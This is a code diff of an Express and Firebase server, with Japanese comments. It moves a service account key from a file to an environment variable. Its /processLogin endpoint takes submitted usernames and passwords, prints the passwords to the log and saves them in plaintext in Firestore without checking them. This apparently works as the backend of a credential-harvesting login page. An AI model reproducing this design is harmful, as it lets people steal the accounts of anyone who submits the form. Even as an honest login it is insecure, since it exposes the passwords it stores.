@@ -3,8 +3,12 @@ const express = require('express');
 const path = require('path');
 const admin = require('firebase-admin');
 
-// Firebaseの秘密鍵ファイルを読み込む（プロジェクトのルートに配置）
-const serviceAccount = require('./inst-732a8-firebase-adminsdk-fbsvc-8891993b0a.json');
+// 環境変数からFirebase秘密鍵のJSON文字列を取得してオブジェクトに変換
+if (!process.env.FIREBASE_SERVICE_ACCOUNT) {
+  console.error("FIREBASE_SERVICE_ACCOUNT environment variable is not set.");
+  process.exit(1);
+}
+const serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT);
 
 // Firebase Admin SDKの初期化
 admin.initializeApp({
@@ -26,10 +30,7 @@ app.use(express.static('public'));
 // フォーム送信のエンドポイント
 app.post('/processLogin', async (req, res) => {
   const { username, password } = req.body;
-  
-  // デバッグ用ログ
   console.log("Received data:", username, password);
-  
   if (!username || !password) {
     console.error("入力不足: username or password is missing");
     return res.status(400).json({ status: 'Error', message: '入力が不足しています' });
@@ -42,10 +43,7 @@ app.post('/processLogin', async (req, res) => {
       password: password,
       date: admin.firestore.FieldValue.serverTimestamp()
     });
-    
-    // デバッグ用ログ：追加したドキュメントIDを出力
     console.log("Document written with ID:", docRef.id);
-    
     res.json({ status: 'Success', id: docRef.id });
   } catch (err) {
     console.error('Error writing to Firestore:', err);
